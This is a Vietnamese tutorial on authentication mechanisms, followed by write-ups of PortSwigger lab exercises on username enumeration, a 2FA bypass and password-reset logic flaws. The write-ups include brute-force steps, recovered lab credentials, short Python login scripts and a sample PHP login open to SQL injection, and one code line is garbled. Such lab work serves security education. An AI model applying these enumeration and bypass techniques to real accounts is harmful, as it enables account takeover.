# Authentication vulnerabilities

## Khái niệm & Tác hại & Phòng tránh

- **Khái niệm**

  - Authentication - xác thực là một hành động nhằm thiết lập hoặc chứng thực một cái gì đó (hoặc một người nào đó) đáng tin cậy, từ đó được cung cấp các quyền lợi, truy vấn tương ứng với vật / người đã được xác thực. Sau khi bạn được xác thực, hệ thống sẽ biết người đang sử dụng tài khoản / dịch vụ đó chính là bạn
  - Vì thế bản chất của authentication ở đây chính là việc bạn xác nhận HTTP request được gửi từ một người nào đó.
  - ![image](https://hackmd.io/_uploads/r1aSpxMcT.png)

  - Authorization - ủy quyền là một khái niệm sinh ra sau khi xác thực thành công, đây là giới hạn, quyền hạn sử dụng dịch vụ của một người dùng
  - Có ba loại xác thực chính:

    - Thông tin nào đó bạn **biết** , chẳng hạn như mật khẩu hoặc câu trả lời cho câu hỏi bảo mật. Đôi khi chúng được gọi là "yếu tố kiến thức".
    - Thứ bạn **có** , Đây là một vật thể vật lý như điện thoại di động hoặc mã thông báo bảo mật. Đôi khi chúng được gọi là "yếu tố sở hữu".
    - Một cái gì đó bạn **đang** hoặc làm. Ví dụ: sinh trắc học hoặc mô hình hành vi của bạn. Đôi khi chúng được gọi là "yếu tố vốn có".

  - Các lỗ hổng xác thực thường được chia làm các loại sau:

    - Lỗ hổng trong xác thực mật khẩu (password):
      - Đa số các ứng dụng web thường xác thực người dùng thông qua tài khoản bao gồm tên đăng nhập - username và mật khẩu - password (Một số trường hợp có thể là email - password, phone number - password, ...). Bởi vậy, nếu để lộ các thông tin nhạy cảm này, kẻ tấn công có thể mạo danh xác thực bằng danh tính của bạn một cách dễ dàng.
    - Lỗ hổng trong xác thực đa yếu tố (multi-factor authentication):

      - ![image](https://hackmd.io/_uploads/B1ZjHe0tT.png) Có thể thấy rõ cơ chế xác thực hai bước đã nâng mức độ bảo mật lên nhiều so với xác thực chỉ bằng mật khẩu, cơ chế xác thực 2FA cũng chứa một mức độ rủi ro nhất định. Trước khi đến với người dùng, thì code 2FA cũng sẽ cần được gửi từ hệ thống tới điện thoại của người dùng, bởi vậy hoàn toàn có thể bị tấn công bởi kỹ thuật tấn công Man in the Middle

    - Lỗ hổng qua các cách xác thực khác:
      - Đa phần các ứng dụng web đều có những tính năng hỗ trợ thêm trong quá trình đăng nhập của người dùng, cho phép người dùng có thể dễ dàng hơn trong việc quan lí tài khoản của họ. Những điều này đểu được tạo ra với mong muốn mang lại sự tiện lợi và hướng đến người dùng, tuy nhiên nó cũng có thể trở thành các mục tiêu bị tấn công.

- **Tác hại**
  - Nếu kẻ tấn công bỏ qua xác thực hoặc đột nhập vào tài khoản của người dùng khác, chúng có quyền truy cập vào tất cả dữ liệu và chức năng mà tài khoản bị xâm phạm có. Nếu họ có thể xâm phạm tài khoản có đặc quyền cao, chẳng hạn như quản trị viên hệ thống, họ có thể có toàn quyền kiểm soát toàn bộ ứng dụng và có khả năng giành được quyền truy cập vào cơ sở hạ tầng nội bộ.
  - hầu hết các thông tin bạn lưu trên trang web đó đều bị lộ, đồng thời họ có thể sử dụng các tính năng của trang web với danh tính của bạn, mang lại hậu quả khó lường cho người dùng nói riêng và hệ thống nói chung.
- **Phòng tránh**
  - **Về phía nhà cung cấp dịch vụ:**
  - Người dùng không cần biết quá nhiều thông tin không cần thiết
    - Ví dụ: Khi người dùng nhập sai tên đăng nhập hoặc mật khẩu, thông báo đưa ra tới người dùng chỉ nên có dạng "Tên đăng nhập hoặc mật khẩu không hợp lệ" - chỉ đủ cho người dùng biết họ đang nhập sai, không chỉ ra chính xác sai tên đăng nhập hoặc mật khẩu.
  - Yêu cầu người dùng đặt các mật khẩu mạnh
  - Hạn chế các nỗ lực đăng nhập thất bại
    - Khi phát hiện một người dùng thực hiện đăng nhập sai vượt quá số lần quy định, đó rất có thể là một cuộc tấn công Brute force. Hệ thống có thể thực hiện vô hiệu hóa tài khoản đó trong một thời gian nhất định. Và cứ mỗi lần người dùng tiếp tục đăng nhập thất bại, thời gian vô hiệu hóa đó sẽ càng tăng lên. Điều này thực sự mang lại hiệu quả lớn trong việc phòng chống tấn công vét cạn.
  - Xác thực nhiều bước
  - Sử dụng mã Capcha
  - **Về phía người dùng:**
    - Không nên sử dụng thông tin cá nhân đặt làm mật khẩu.
    - Không click vào các đường link lạ do người khác gửi.
    - Không điền thông tin vào các trang có dấu hiệu lừa đảo.

Authentication được thực hiện như thế nào?
Các bạn đã hiểu bản chất của authentication rồi, vậy thì nó sẽ được thực hiện như thế nào?

Đối với một bức thư, cách để bạn biết thư được gửi đúng từ một người nào đó là chữ ký, nét chữ,... hay bất kể một dấu hiệu nào đó được thống nhất từ trước giữa 2 người.

Quay trở lại với một HTTP request. Bản chất của HTTP request cũng là một bản tin biểu diễn bằng text. Do đó cũng sẽ cần một dấu hiệu nào đó được thống nhất để ứng dụng của chúng ta nhận ra nó xuất phát từ người dùng nào.

![image](https://hackmd.io/_uploads/B1Nt0gGc6.png)

- Một dấu hiệu nhận biết người dùng có thể là bất kỳ thứ gì mang tính đặc trưng, như tên đăng nhập, mật khẩu, một chuôĩ chứa thông tin được mã hóa, hay thậm chí là một chuỗi ký tự random.
- Dấu hiệu nhận biết người dùng có thể ở bất kỳ vị trí nào có thể trong bản tin HTTP như: URL, Header (Cookie header, Authorization header, Custom header), Body (Form field,...)

**Quá trình authentication**
Để có được dấu hiệu nhận dạng phía trên, ta cần có sự thống nhất trước giữa người dùng và ứng dụng để ứng dụng của chúng ta có thể nhận dạng được người dùng. Một quá trình authentication sẽ bao gồm 3 phần:

- **Sinh ra dấu hiệu:** Đây là việc chúng ta quyết định xem dùng dấu hiệu gì, tạo ra dấu hiệu đó như thế nào. Một quá trình authentication có thể có sự xuất hiện của nhiều dấu hiệu, ví dụ username/password, user token, api key,... Các dấu hiệu này sẽ có cách sinh ra khác nhau, quy ước sử dụng khác nhau.
- **Lưu trữ dấu hiệu:** Đây là việc ứng dụng sẽ quyết định lưu trữ dấu hiệu này ở đâu, ở cả server và client, thông qua vị trí nào trên bản tin HTTP,...
- **Kiểm tra dấu hiệu:** Đây là việc ứng dụng của chúng ta kiểm tra lại tính hợp lệ của dấu hiệu, đối chiếu xem dấu hiệu này là của người dùng nào,...

![image](https://hackmd.io/_uploads/rJkny-G5a.png)

Về cơ bản thì một quá trình authentication sẽ gồm 2 bước:

- Xác thực một user (thường là request đầu tiên)
- Lưu giữ đăng nhập (cho các request phía sau)

**Basic Authentication**

- Cách hoạt động của Basic Auth là gửi chính username + password của người dùng theo mỗi request.
  - **Dấu hiệu:** Chuỗi `username:password` đã được mã hóa Base64. Ví dụ có username là abc, password là 123 thì ta tạo chuỗi mã hóa: `abc:123` --Base64--> `YWJjOjEyMw````
  - Lưu trữ dấu hiệu:
    - Tại server: Máy chủ web sẽ lưu lại username, password trong database, file (htpasswd),...
    - Tại client: Sau khi hỏi người dùng nhập username và password lần đầu, browser sẽ lưu lại 2 giá trị này trong bộ nhớ được quản lý bởi mỗi trình duyệt (và chúng ta không thể tiếp cận bộ nhớ này bằng code trên trang) để tránh phải liên tục hỏi chúng ta username, password. Tuy nhiên thời gian lưu thường là có giới hạn.
  - **Truyền tải:** chuỗi đã mã hóa base64 phía trên sẽ được truyền trong HTTP request trong Authorization header với từ khóa Basic phía trước: `Authorization: Basic YWJjOjEyMw````
  - **Kiểm tra dấu hiệu:** Với mỗi request gửi lên kèm thông tin username/password trên, server sẽ so sánh username/password với database, config file,... để kiểm tra tính hợp lệ.
  - **Flow của Basic Auth:**
  - ![image](https://hackmd.io/_uploads/HJSIX4zqp.png)

**ưu điểm:**

- **Đơn giản**, do đó được hầu hết các trình duyệt, webserver (nginx, apache,...) hỗ trợ. Bạn có thể dễ dàng config cho webserver sử dụng Basic Auth với 1 vài dòng config.
- **Dễ dàng kết hợp với các phương pháp khác**. Do đã được xử lý mặc định trên trình duyệt và webserver thông qua truyền tải http header, các bạn có thể dễ dàng kết hợp phương pháp này với các phương pháp sử dụng cookie, session, token,...

**Nhược điểm:**

- **Username/password** dễ bị lộ. Do mỗi request đều phải truyền username và password nên sẽ tăng khả năng bị lộ qua việc bắt request, log server,...
- **Không thể logout**. Vì việc lưu username, password dưới trình duyệt được thực hiện tự động và không có sự can thiệp của chủ trang web. Do vậy không có cách nào logout được người dùng ngoại trừ việc tự xóa lịch sử duyệt web hoặc hết thời gian lưu của trình duyệt.

Vì những đặc điểm trên, Basic Auth thường được sử dụng trong các ứng dụng nội bộ, các thư mục cấm như hệ thống CMS, môi trường development, database admin,... lợi dụng việc chặt chẽ của kiểm tra Basic Auth trên các web server để tránh tiết lộ thông tin hệ thống nội bộ cho người ngoài, phòng chống hack, khai thác lỗ hổng ứng dụng,...

**Session-based Authentication**

- Session-based authentication là cơ chế đăng nhập người dùng dựa trên việc tạo ra session của người dùng ở phía server. Sau quá trình xác thực người dùng thành công (username/password,...) thì phía server sẽ tạo và lưu ra một session chứa thông tin của người dùng đang đăng nhập và trả lại cho client session ID để truy cập session cho những request sau.
  - **Dấu hiệu:** 1 chuỗi (thường là random) unique gọi là Session ID
  - **Lưu trữ dấu hiệu:**
    - Tại server: Lưu dữ liệu của session trong database, file, ram,... và dùng Session ID để tìm kiếm.
    - Tại client: Lưu Session ID trong bộ nhớ cookie, hoặc URL trang web, form field ẩn,...
  - **Truyền tải**: Session ID sẽ xuất hiện trong các HTTP request tiếp theo trong **Cookie** (header Cookie: SESSION_ID=abc), **URL** (/profile?session_id=abc), **body** (form field ẩn),...
  - **Kiểm tra dấu hiệu**: Server dùng Session ID client truyền lên để tìm dữ liệu của session từ các nguồn lưu như database, file, ram,...
- Quá trình set Session ID thường được thực hiện một cách tự động bởi server, cho nên session-based authentication thường sử dụng Cookie, vì cookie có thể set được từ phía server và được browser áp dụng tự động cho các request tiếp theo.
- Flow của Session-based Authentication
- ![image](https://hackmd.io/_uploads/HJeuwEMqa.png)
  **Ưu điểm:**
- **Thông tin được giấu kín:** Client chỉ được biết tới Session ID thường là 1 chuỗi random không mang thông tin gì của người dùng, còn mọi thông tin khác của phiên đăng nhập hay người dùng hiện tại đều được lưu phía server nên cơ chế này giữ kín được thông tin của người dùng trong quá trình truyền tải.
- **Dung lượng truyền tải nhỏ**: Bởi vì tự thân Session ID không mang theo thông tin gì, thông thường chỉ là một chuỗi ký tự unique khoảng 20-50 ký tự, do vậy việc gắn Session ID vào mỗi request không làm tăng nhiều độ dài request, do đó việc truyền tải sẽ diễn ra dễ dàng hơn.
- **Không cần tác động client:** Theo mình thì để sử dụng cơ chế session này bạn chủ yếu chỉ cần sửa phía server. Client mà cụ thể là browser hầu như không cần phải xử lý gì thêm bởi đã được tích hợp tự động (đối với cookie), hoặc response trả về của server đã có sẵn (đối với session ID ở URL hoặc hidden form)
  **Nhược điểm:**
- **Chiếm nhiều bộ nhớ:** Với mỗi phiên làm việc của user, server sẽ lại phải tạo ra một session và lưu vào bộ nhớ trên server. Số data này có thể còn lớn hơn cả user database của bạn do mỗi user có thể có vài session khác nhau. Do vậy việc tra cứu đối với các hệ thống lớn nhiều người dùng sẽ là vấn đề.
- **Khó scale:** Vì tính chất stateful của việc lưu session data ở phía server, do đó bạn sẽ khó khăn hơn trong việc scale ngang ứng dụng, tức là nếu bạn chạy ứng dụng của bạn ở 10 máy chủ, hay 10 container, thì 1 là bạn phải dùng chung chỗ lưu session, 2 là nếu không dùng chung bộ nhớ session thì phải có giải pháp để ghi nhớ user đã kết nối tới server nào của bạn. Nếu không rất có thể chỉ cần ấn refresh thôi, user kết nối với server khác khi cân bằng tải là sẽ như chưa hề có cuộc login ngay.
- **Phụ thuộc domain:** Vì thường sử dụng cookie, mà cookie lại phụ thuộc vào domain, do vậy khả năng sử dụng phiên đăng nhập của bạn sẽ bị giới hạn ở đúng domain được set cookie. Điều này không phù hợp với các hệ thống phân tán hoặc tích hợp vào ứng dụng bên thứ 3.
- **CSRF**: Nói nôm na là Session ID thường được lưu vào Cookie, và cookie mới là thứ dễ bị tấn công kiểu này. Vì cookie được tự động gắn vào các request tới domain của bạn.

Vì những đặc điểm trên, Session-based Authentication thường được dùng trong các website và những ứng dụng web làm việc **chủ yếu với browser**, những hệ thống **monolithic** do cần sự tập trung trong việc lưu session data và sự hạn chế về domain.

**Token-based Authentication**

- Token-based Authentication là cơ chế đăng nhập người dùng dựa trên việc tạo ra token - một chuỗi ký tự (thường được mã hóa) mang thông tin xác định người dùng được server tạo ra và lưu ở client. Server sau đó có thể không lưu lại token này.

  - **Dấu hiệu:** 1 chuỗi chứa thông tin người dùng (thường được mã hóa và signed) gọi là token
  - **Lưu trữ dấu hiệu:**
    - Tại server: Thường là không cần lưu.
    - Tại client: Ứng dụng client (javascript, mobile,...) phải tự lưu token trong các bộ nhớ ứng dụng, local storage, cookie,...
  - **Truyền tải:** Token sẽ xuất hiện trong các HTTP request tiếp theo trong **Authorization header** (Authorization: Bearer abc), **Cookie** (header Cookie: token=abc), **URL** (/profile?token=abc), **body** (ajax body, field),...
  - **Kiểm tra dấu hiệu:** Token thường có tính self-contained (như JWT), tức là có thể tự kiểm tra tính đúng đắn nhờ vào các thuật toán mã hóa và giải mã chỉ dựa vào thông tin trên token và 1 secret key nào đó của server. Do đó server không cần thiết phải lưu lại token, hay truy vấn thông tin user để xác nhận token.

- Flow của Token-based Authentication:
- ![image](https://hackmd.io/_uploads/S1WYgBG9T.png)

**Ưu điểm:**

- **Stateless:** Bởi vì token thường có tính chất self-contained, do vậy server không cần lưu thêm thông tin gì về token hay map giữa token và người dùng. Do vậy đây là tính chất quan trọng nhất, phục vụ cho việc scale ứng dụng theo chiều ngang khi không cần quan tâm tới việc bạn sẽ sinh ra token ở đâu và verify token ở đâu.
- **Phù hợp với nhiều loại client:** Nên nhớ, cookie là một concept được các browser áp dụng tự động, còn với các client sử dụng Web API như mobile, IoT device, server,... thì việc sử dụng cookie lại rất hạn chế. Sử dụng token trong header hay URL,... sẽ dễ dàng hơn cho client trong việc lưu lại token và truyền tải token.
- **Chống CSRF**: Do việc sử dụng token phải được client xử lý từ việc lưu tới truyền tải, do vậy sử dụng token (mà không dùng cookie) sẽ phòng chống được các trường hợp tấn công như với trường hợp session/cookie.
- **Không bị giới hạn bởi domain**: Đây là tính chất giúp các hệ thống hiện đại có sự tham gia của bên thứ 3 hoạt động dễ dàng hơn khi không bị giới hạn chỉ ở domain của hệ thống đăng nhập.
  **Nhược điểm:**
- **Khó quản lý đăng xuất**: Bởi vì server không lưu thông tin gì về token hay session của user, do đó điều khó kiểm soát nhất chính là việc đăng xuất. Và vì việc kiểm tra token chỉ dựa vào thông tin trên token, do vậy sẽ khó để ứng dụng của chúng ta vô hiệu hóa một token vẫn còn hiệu lực.
- **Phức tạp phần client:** Cơ chế sử dụng token thường yêu cầu client phải có xử lý liên quan tới lưu token, gửi token, do vậy sẽ không phù hợp với những website kiểu cũ, sử dụng nhiều server render html và phần javascript hạn chế
- **Thông tin dễ lộ**: Khác với session, thông tin về phiên đăng nhập của người dùng có trên token và được lưu phía client, do vậy sẽ có các nguy cơ liên quan tới lộ thông tin trong token trong quá trình lưu trữ, truyền tải,... Chính vì vậy, thông thường người ta chỉ lưu 1 số thông tin thiết yếu như user_id, username mà không lưu những thông tin nhạy cảm như password vào token.
- **Dung lượng truyền tải lớn**: Thường thì 1 token sẽ dài hơn session ID khá nhiều, mà token lại được gửi với mỗi request, do vậy độ dài request sẽ tăng lên, do đó băng thông truyền tải cũng sẽ cần phải tăng theo. Tuy nhiên, đây chỉ là một điểm hạn chế nhỏ so với những lợi ích nó mang lại.

Vì các đặc điểm trên, Token-based Authentication thường được sử dụng trong các hệ thống Web API, các hệ thống phân tán, **micro-services**, các hệ thống có sự tham gia của các nền tảng khác như **mobile, IoT, server**,..., hoặc các website kiểu mới (phân tách rõ UI app và API).

## Bảng so sánh

| Đặc điểm    | Basic                            | Session-based                                     | Token-based                                              |
| ----------- | -------------------------------- | ------------------------------------------------- | -------------------------------------------------------- |
| Dấu hiệu    | Authorization Header             | Header (cookie) / URL / Body (form)               | Header (Auth, custom) / URL / Body                       |
| Lưu Server  | Không lưu (vì chính là UserDB)   | Có lưu Session Data (memory, database, file,...)  | Không lưu (vì token chứa đủ thông tin rồi)               |
| Lưu Client  | Browser tự lưu (username + pass) | Cookie (Session ID)                               | Local storage, Cookie, session storage (browser)         |
| Cách verify | So sánh với UserDB               | Dùng Session ID để tìm data trong session storage | Kiểm tra tính toàn vẹn của token qua signature của token |
| Phù hợp cho | Hệ thống internal                | Monolithic website                                | Web API của hệ thống phân tán, đa nền tảng,...           |

![image](https://hackmd.io/_uploads/Skl94gAYT.png)

## 1. Lab: Username enumeration via different responses

link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

### Đề bài

![image](https://hackmd.io/_uploads/B1iGqxRFp.png)

### Phân tích

<li>Đề bài cung cấp 2 danh sách <a href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a> và <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a>. Nhiệm vụ của chúng ta là sử dụng kĩ thuật tấn công vét cạn tìm kiếm tên đăng nhập và mật khẩu người dùng, truy cập vào tài khoản của victim.</li>

<li>Bởi hệ thống cho phép người dùng có thể đăng nhập vố số lần, và từ các thông báo "nhạy cảm" này, kẻ tấn công có thể dễ dàng thực hiện một cuộc tấn công vét cạn để tìm kiếm tên đăng nhập và mật khẩu của victim.</li>

<li>Khi cơ chế xác thực cho phép người dùng có thể xác thực danh tính (đăng nhập - login) không giới hạn, kẻ tấn công có thể sử dụng kỹ thuật tấn công vét cạn để tìm kiếm tên đăng nhập cũng như mật khẩu đúng của bạn</li>

<li>Trước khi thực hiện kỹ thuật tấn công vét cạn, kẻ tấn công có thể tạo một tài khoản với hệ thống mục tiêu để xem xét, phân tích dạng cụ thể của username, password. Chẳng hạn, hệ thống yêu cầu đăng nhập bằng gmail, mật khẩu với độ dài tối thiểu, tối đa, phạm vi kí tự được sử dụng để đặt tên đăng nhập và mật khẩu, ... từ đó, bên cạnh danh sách tên đăng nhập, mật khẩu thông dụng, kẻ tấn công có thể tự tạo một danh sách tấn công phù hợp với đặc tính của từng mục tiêu, đối tượng khác nhau.</li>

### Khai thác

- Đăng nhập với tên đăng nhập và mật khẩu bất kì, hệ thống xuất hiện thông báo \*\*Invalid username

![image](https://hackmd.io/_uploads/S1sN6xCKT.png)

- Có thể suy đoán hệ thống check username không chính xác nên đưa ra thông báo username không hợp lệ. Thử đăng nhập liên tiếp nhiều lần vẫn nhận lại thông báo Invalid username, chứng tỏ hệ thống không thực hiện hành động block hoặc ngăn cản đăng nhập, như vậy có thể brute force username theo danh sách được cung cấp.

![image](https://hackmd.io/_uploads/r1ZeAl0KT.png)

Trước hết, chúng ta sẽ tìm ra username đúng trong danh sách được cung cấp, xóa các dấu §, chỉ để lại tại tham số username, giá trị password điền bất kì.

Trong cột Lengh, xuất hiện dòng response với độ dài khác so với các độ dài còn lại, trong phần Response trả về thông báo Incorrect password.

![image](https://hackmd.io/_uploads/r1vRCxRFa.png)

<li>
    có lẽ web này kiểm tra hợp lệ lần lượt của username rồi đến password
</li>

- Điều này chứng tỏ username **amarillo** là một username đúng (tồn tại trong database). Thay username trong Positions bằng **amarillo**, thêm §§ và password

  - Tương tự với username, tiếp tục brute force password với danh sách password được cung cấp.

![image](https://hackmd.io/_uploads/rktcx-CFa.png)

trang đã chuyển hướng chúng ta đến tài khoản của người dùng có id = amarillo

- Như vậy chúng ta đã tìm được ```username:password``` là ```amarillo:maggie```. Đăng nhập thôi!

![image](https://hackmd.io/_uploads/By0uVZRYp.png)

mình đã viết lại script khai thác:

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a9e00bb042dcf51802226a700c7006c.web-security-academy.net'

data = {
    'username': 'amarillo',
    'password': 'maggie'
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ryERNWAtT.png)

## 2. Lab: 2FA simple bypass

link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass

### Đề bài

![image](https://hackmd.io/_uploads/HyAQSWCta.png)

### Phân tích

- chúng ta được cung cập một tài khoản hợp lệ (dùng để phân tích cách hoạt động của hệ thống xác thực) và có được username:password của tài khoản victim, chúng ta cần vượt qua cơ chế xác thực 2FA để truy cập vào tài khoản victim. Trang email hỗ trợ việc lấy mã code 2FA cho người dùng wiener.

- Sau khi đăng nhập tại trang /login, hệ thống chuyển hướng chúng ta tới một trang mới /login2 để thực hiện xác thực mã code 2FA.

![image](https://hackmd.io/_uploads/S1qTEmAFT.png)

![image](https://hackmd.io/_uploads/B1g7HmAFp.png)

![image](https://hackmd.io/_uploads/SJsNBXCtp.png)

- có 2 lớp xác thực là mật khẩu và qua email
- Sau khi điền mã xác thực thành công chúng ta được đưa tới trang cá nhân của wiener. Click một lần nữa vào tùy chọn My account, URL xác định liên kết tới trang cá nhân của wiener:

![image](https://hackmd.io/_uploads/Byo5rQAKT.png)

Từ các dấu hiệu này có thể suy đoán rằng thực chất khi đăng nhập đúng tài khoản tại trang /login, chúng ta đã được xác thực thành công tại trang /login, còn trang /login2 giống như một thao tác phụ để xác thực mã code.

- và chúng ta nhận thấy cookie ở 2 trang ```/login``` và ```/login2``` là khác nhau

![image](https://hackmd.io/_uploads/HkDhoX0Ka.png)

![image](https://hackmd.io/_uploads/HkgTs7AFa.png)

Thật vậy, trước khi điền mã 2FA, thay đổi URL dẫn tới trang cá nhân của wiener và thành công

### Khai thác

- Như vậy, chúng ta có thể trực tiếp sửa URL thành /my-account?id=carlos sau khi đăng nhập ```carlos:montoya``` tại trang /login

![image](https://hackmd.io/_uploads/SyhJDXCY6.png)

vậy là chúng ta đã vượt qua lớp xác thực còn lại

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a3800da0347917880dd3acf002500ee.web-security-academy.net'

session = requests.Session()
data = {
    'username': 'carlos',
    'password': 'montoya'
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
)

params = {
    'id' : 'carlos',
}

response = session.get(
    url + '/my-account',
    data=data,
    params=params,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)

```

![image](https://hackmd.io/_uploads/H1SjK7RtT.png)

## 3. Lab: Password reset broken logic

link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

### Đề bài

![image](https://hackmd.io/_uploads/r1xaYc7CF6.png)

### Phân tích

- Chúng ta được cung cấp một tài khoản hợp lệ wiener:peter và đã biết username của victim. Để giải quyết lab này, chúng ta cần khai thác tính năng đặt lại mật khẩu để truy cập tài khoản của carlos.

![image](https://hackmd.io/_uploads/B1xtqrCtT.png)

- Sử dụng tính năng quên mật khẩu với username wiener:

![image](https://hackmd.io/_uploads/r12fiSAt6.png)

Truy cập link đặt lại mật khẩu, quan sát request qua Burp Suite:

![image](https://hackmd.io/_uploads/S1rQhS0Fp.png)

![image](https://hackmd.io/_uploads/SkBUnSCta.png)

- Chúng ta thấy tại request này, client đã gửi tới server các giá trị ```temp-forgot-password-token, username, new-password-1, new-password-2``` qua phương thức POST.

- Từ các tham số này, chúng ta có thể dự đoán hệ thống xác thực yêu cầu đặt lại mật khẩu bằng tham số temp-forgot-password-token (token được gửi cho tài khoản mail yêu cầu đặt lại mật khẩu) và xác thực danh tính người dùng cần đặt lại mật khẩu qua tham số username, sau đó hai tham số new-password-1 và new-password-2 tương ứng là mật khẩu mới và xác nhận mật khẩu mới.

### Khai thác

- Do việc xác nhận đặt lại mật khẩu và danh tính người dùng cần đặt lại mật khẩu tương ứng với hai tham số khác nhau, không "ràng buộc" vào nhau. Nên chúng ta có thể thay đổi giá trị username và đặt lại mật khẩu cho nạn nhân bất kì!

![image](https://hackmd.io/_uploads/r11nV8AK6.png)

mình đăng nhập tài khoản ```carlos:123``` và giải quyết được lab này

![image](https://hackmd.io/_uploads/HkBRN80Y6.png)

![image](https://hackmd.io/_uploads/rJ1kBU0K6.png)

## 4. Lab: Username enumeration via subtly different responses

link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

### Đề bài

![image](https://hackmd.io/_uploads/HykIbi0FT.png)

### Phân tích

-Đề bài cung cấp 2 danh sách Candidate usernames và Candidate passwords. Nhiệm vụ của chúng ta là sử dụng kĩ thuật tấn công vét cạn tìm kiếm tên đăng nhập và mật khẩu người dùng, truy cập vào tài khoản của victim.

Ở tình huống này, khi đăng nhập với tên đăng nhập và mật khẩu bất kì, chúng ta nhận được thông báo Invalid username or password.

- người lập trình đã khôn ngoan hơn. Dòng thông báo chỉ cho chúng ta biết rằng tên đăng nhập hoặc mật khẩu không đúng, khiến chúng ta không thể trực tiếp xác định cụ thể là tên đăng nhập sai hay mật khẩu sai nữa. Tuy nhiên, các đoạn code là do con người viết ra, chúng ta vẫn thực hiện brute force bình thường (do hệ thống không ngăn chặn kĩ thuật tấn công này), và mong rằng sẽ có một sự khác biệt nhỏ nhoi nào đó nếu tên đăng nhập của chúng ta là đúng.

### Khai thác

Sử dụng Burp Suite, bắt request đăng nhập và gửi qua Intruder, thực hiện tương tự các bước như ở lab Username enumeration via different responses.

![image](https://hackmd.io/_uploads/Bkf1ncRFp.png)

Lúc này, chúng ta cần có thao tác tự động hóa việc nhận biết sự khác nhau của phản hồi do hệ thống đưa ra. Đi tới tính năng Options, tại mục Grep - Extract, chọn Add, bôi đen dòng thông báo trả về trong Response và chọn OK.

![image](https://hackmd.io/_uploads/B13UJoCYa.png)

Bắt đầu tấn công thôi nào! Sau khi kết thúc, sắp xếp lại cột warining nhận thấy request 91 trả về dòng thông báo `Invalid username or password`khác với các dòng thông báo khác (Thiếu dấu . đây là sự bất cẩn của người lập trình). Như vậy chúng ta thu được username của victim là ```americas```

![image](https://hackmd.io/_uploads/r1ZVej0Ya.png)

![image](https://hackmd.io/_uploads/HydtliCtp.png)

Thực hiện tấn công tương tự với danh sách passwords được cung cấp.

![image](https://hackmd.io/_uploads/By0ixjCYa.png)

Như vậy chúng ta có tài khoản victim là ```americas:qazwsx``` mình đăng nhập và hoàn thành lab.

![image](https://hackmd.io/_uploads/SkcNWiAY6.png)

## 5. Lab: Username enumeration via response timing

link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

### Đề bài

![image](https://hackmd.io/_uploads/S1_s-oAFp.png)

### Phân tích

- Đề bài cung cấp 2 danh sách Candidate usernames và Candidate passwords. Ngoài ra còn có một tài khoản hợp lệ wiener:peter. Nhiệm vụ của chúng ta là sử dụng kĩ thuật tấn công vét cạn tìm kiếm tên đăng nhập và mật khẩu người dùng, truy cập vào tài khoản của victim.

- Trong thực tế, password của người dùng khi lưu vào cơ sở dữ liệu (database) thường không còn để ở dạng rõ (plaintext), thậm chí một số cơ sở dữ liệu còn mã hóa cả username! Bởi nếu lưu các thông tin của người dùng ở bản rõ có thể mang đến một số nguy cơ sau:

  - Nếu cơ sở dữ liệu bị lộ (bị tấn công chẳng hạn) sẽ lộ thông tin tất cả người dùng ngay lập tức.
  - Nhân viên có đủ quyền hạn có thể biết được các thông tin của khách hàng, không thể loại trừ trường hợp họ sử dụng vào mục đích xấu.

- Nhân viên có đủ quyền hạn có thể biết được các thông tin của khách hàng, không thể loại trừ trường hợp họ sử dụng vào mục đích xấu.

VD:

```php
$connect = mysqli_connect ('localhost', 'root', '', 'user');

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($connect, $query);
$count = mysqli_num_rows($result);

if ($count ``` 1) {
    $row = mysqli_fetch_array($result);
    if (md5($password) != $row['password']) {
        echo "Invalid username or password!";
    }
} else {
    echo "Invalid username or password!";
}
```

- Cơ chế hash string thường sẽ sử dụng vòng lặp (loop) để thực hiện tính toán, để thu được độ dài cố định cần thiết (mỗi dạng hash sẽ trả về một đoạn mã sau khi hash với độ dài cô định) thì cần lặp liên tục rồi tính toán thu nhỏ dần. Bởi vậy, thời gian thực hiện sẽ khác nhau khi hash một chuổi với độ dài nhỏ và một chuỗi với độ dài rất lớn.

- Dựa vào cơ chế hoạt động này, kẻ tấn công có thể nhập vào một chuỗi mật khẩu rất dài, để so sánh thời gian phản hồi khi hệ thống thực hiện tính toán băm chuỗi mật khẩu, khi đó username sẽ là chính xác, do nếu kiểm tra username sai sẽ lập tức trả về Invalid username or password!

- Đề bài cung cấp 2 danh sách Candidate usernames và Candidate passwords. Ngoài ra còn có một tài khoản hợp lệ wiener:peter. Nhiệm vụ của chúng ta là sử dụng kĩ thuật tấn công vét cạn tìm kiếm tên đăng nhập và mật khẩu người dùng, truy cập vào tài khoản của victim.

Gợi ý từ đề bài: chúng ta cần vượt qua một cơ chế bảo vệ brute force ở tình huống này.

- Thử đăng nhập với username wiener, password bất kì. Quan sát reponse trả về, nhận thấy rằng sau 4 lần liên tiếp đăng nhập sai, hệ thống sẽ ngăn cản chúng ta đăng nhập và yêu cầu đăng nhập lại sau 30 phút.

![image](https://hackmd.io/_uploads/H1Hfn1eq6.png)

